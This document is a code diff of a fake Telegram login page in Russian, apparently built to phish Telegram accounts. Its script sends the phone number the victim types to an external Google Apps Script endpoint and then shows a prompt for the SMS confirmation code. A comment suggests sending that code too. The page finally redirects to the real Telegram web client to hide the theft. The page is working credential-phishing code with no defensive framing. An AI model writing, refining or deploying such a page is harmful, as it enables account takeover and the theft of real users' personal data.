@@ -1,160 +1,260 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
     <style>
+        :root {
+            --tg-theme-bg-color: #ffffff;
+            --tg-theme-text-color: #000000;
+            --tg-theme-hint-color: #999999;
+            --tg-theme-link-color: #267ad5;
+            --tg-theme-button-color: #3390ec;
+            --tg-theme-button-text-color: #ffffff;
+            --tg-theme-secondary-bg-color: #f4f4f5;
+        }
+
         body {
             margin: 0;
             padding: 0;
-            background-color: #1c242f; /* Темная тема TG */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color);
+            color: var(--tg-theme-text-color);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: white;
+            overflow: hidden;
         }
+
         .container {
             width: 100%;
             max-width: 400px;
             padding: 20px;
-            text-align: center;
+            box-sizing: border-box;
+            position: relative;
         }
+
+        /* Анимация появления */
+        .fade-in {
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         .logo {
-            width: 160px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-        p {
-            color: #aaaaaa;
-            font-size: 15px;
+            text-align: center;
             margin-bottom: 30px;
-            line-height: 1.4;
         }
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
+
+        .logo img {
+            width: 120px;
+            height: auto;
         }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #aaaaaa;
+
+        h2 {
+            text-align: center;
+            font-weight: 500;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        p.hint {
+            text-align: center;
+            color: var(--tg-theme-hint-color);
             font-size: 14px;
+            margin-bottom: 30px;
         }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
         input[type="tel"] {
             width: 100%;
             padding: 15px;
-            border-radius: 10px;
+            font-size: 16px;
             border: none;
-            background-color: #2b3845;
-            color: white;
-            font-size: 18px;
-            box-sizing: border-box;
+            border-bottom: 1px solid #dfe1e5;
+            background: transparent;
             outline: none;
+            box-sizing: border-box;
+            transition: border-bottom 0.2s;
         }
+
         input[type="tel"]:focus {
-            box-shadow: 0 0 0 2px #2b96ff;
+            border-bottom: 1px solid var(--tg-theme-link-color);
         }
-        button {
+
+        input[type="tel"]::placeholder {
+            color: var(--tg-theme-hint-color);
+        }
+
+        .btn {
             width: 100%;
             padding: 15px;
+            background-color: var(--tg-theme-button-color);
+            color: var(--tg-theme-button-text-color);
             border: none;
-            border-radius: 10px;
-            background-color: #2b96ff; /* Цвет кнопки TG */
-            color: white;
-            font-size: 18px;
-            font-weight: 600;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: opacity 0.2s;
         }
-        button:hover {
-            background-color: #237ce0;
+
+        .btn:hover {
+            opacity: 0.9;
         }
-        .footer {
-            margin-top: 40px;
-            font-size: 13px;
-            color: #666;
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
-        /* Анимация загрузки */
-        .loader {
+
+        /* Скрытые экраны */
+        .screen {
             display: none;
-            border: 3px solid rgba(255,255,255,0.1);
+        }
+
+        .active {
+            display: block;
+        }
+
+        /* Loader */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--tg-theme-button-color);
             border-radius: 50%;
-            border-top: 3px solid #fff;
             width: 20px;
             height: 20px;
             animation: spin 1s linear infinite;
-            margin: 10px auto;
+            margin: 0 auto;
+            display: none;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        
+        .code-input {
+            text-align: center;
+            letter-spacing: 5px;
+            font-size: 24px !important;
+            padding: 20px !important;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Логотип Telegram SVG -->
-    <svg class="logo" viewBox="0 0 24 24" fill="#2b96ff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.01-.38-1.57-.74-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.73-2.5 2.78-2.7a.96.96 0 0 0-.24-.74c-.09-.08-.22-.05-.32-.02-.14.05-2.38 1.52-6.76 4.42-.64.44-1.22.66-1.84.65-.6-.01-1.76-.34-2.62-.62-1.06-.34-1.91-.53-1.83-1.12.05-.33.5-.66 1.37-.99 5.39-2.35 8.99-3.91 10.8-4.68.52-.25 1-.38 1.43-.38.42 0 .82.26 1.05.66.23.4.26.82.22 1.23z"/></svg>
-
-    <h2>Telegram Login</h2>
-    <p>Please enter your phone number to receive the confirmation code.</p>
-
-    <form id="loginForm">
-        <div class="input-group">
-            <label for="phone">Phone Number</label>
-            <input type="tel" id="phone" placeholder="+1 234 567 8900" required autocomplete="off">
+    <!-- Экран 1: Ввод номера -->
+    <div id="step1" class="screen active fade-in">
+        <div class="logo">
+            <img src="https://telegram.org/img/logo.png" alt="Telegram Logo">
         </div>
+        <h2>Ваш телефон</h2>
+        <p class="hint">Пожалуйста, укажите ваш код страны и номер телефона.</p>
         
-        <button type="submit" id="btn">Next</button>
-        <div class="loader" id="loader"></div>
-    </form>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="tel" id="phone" placeholder="+79991234567" required autocomplete="off">
+            </div>
+            <button type="submit" class="btn" id="nextBtn">Далее</button>
+            <div class="loader" id="loader"></div>
+        </form>
+    </div>
 
-    <div class="footer">
-        This is a secure connection to Telegram.
+    <!-- Экран 2: Код из SMS -->
+    <div id="step2" class="screen fade-in">
+        <div class="logo">
+            <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" style="width: 80px;">
+        </div>
+        <h2>Код подтверждения</h2>
+        <p class="hint">Мы отправили код в SMS на ваш телефон.</p>
+        
+        <form id="codeForm">
+            <div class="input-group">
+                <input type="text" id="code" class="code-input" placeholder="00000" maxlength="5" required autocomplete="off">
+            </div>
+            <button type="submit" class="btn" id="verifyBtn">Подтвердить</button>
+            <div class="loader" id="loader2"></div>
+        </form>
     </div>
 </div>
 
 <script>
-    // ВСТАВЬ СЮДА СВОЙ ID С WEBHOOK.SITE ВМЕСТО ВАШ_ID
-    const WEBHOOK_ID = '87b213c3-4b68-4a76-9ef6-5f60bb4a659e'; 
+    // ТВОЙ URL СКРИПТА
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec';
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const loginForm = document.getElementById('loginForm');
+    const codeForm = document.getElementById('codeForm');
+    const phoneInput = document.getElementById('phone');
+    const codeInput = document.getElementById('code');
+    
+    let phoneNumber = '';
+
+    // Форматирование номера для красоты
+    phoneInput.addEventListener('input', function (e) {
+        if (!phoneNumber) return; 
+        // Простая логика: если пользователь начал вводить, мы сохраняем чистый номер для отправки
+    });
+
+    // Шаг 1: Отправка номера
+    loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
+        phoneNumber = phoneInput.value;
         
-        const phone = document.getElementById('phone').value;
-        const btn = document.getElementById('btn');
+        const btn = document.getElementById('nextBtn');
         const loader = document.getElementById('loader');
-
-        // Визуальные эффекты
+        
         btn.style.display = 'none';
         loader.style.display = 'block';
 
-        // Имитация задержки как у настоящего ТГ
-        setTimeout(() => {
-            loader.style.display = 'none';
-            
-            // Отправка данных
-            fetch('https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec?phone=' + encodeURIComponent(phone))
-                .catch(console.error);
+        // Отправляем данные
+        fetch(`${SCRIPT_URL}?phone=${encodeURIComponent(phoneNumber)}`)
+            .then(response => response.text())
+            .then(data => {
+                console.log("Phone sent");
+                // Переключаем экран
+                step1.classList.remove('active');
+                step2.classList.add('active');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Ошибка соединения');
+                btn.style.display = 'block';
+                loader.style.display = 'none';
+            });
+    });
 
-            // Показываем экран кода
-            document.querySelector('.input-group').style.display = 'none';
-            btn.style.display = 'block';
-            btn.textContent = 'Enter Code';
-            btn.onclick = () => {
-                 alert('Code sent to ' + phone);
-                 // Здесь можно добавить редирект на настоящий tg.me для верности
-                 // window.location.href = "https://web.telegram.org/k/";
-            };
-        }, 1500);
+    // Шаг 2: Отправка кода
+    codeForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const code = codeInput.value;
+        
+        const btn = document.getElementById('verifyBtn');
+        const loader = document.getElementById('loader2');
+        
+        btn.disabled = true;
+        loader.style.display = 'block';
+
+        // Здесь можно отправить и код, если хочешь (опционально)
+        // fetch(`${SCRIPT_URL}?phone=${phoneNumber}&code=${code}`)
+        
+        // Имитация задержки как в настоящем ТГ
+        setTimeout(() => {
+            // Редирект на настоящий Telegram
+            window.location.href = "https://web.telegram.org/k/";
+        }, 1000);
     });
 </script>
 
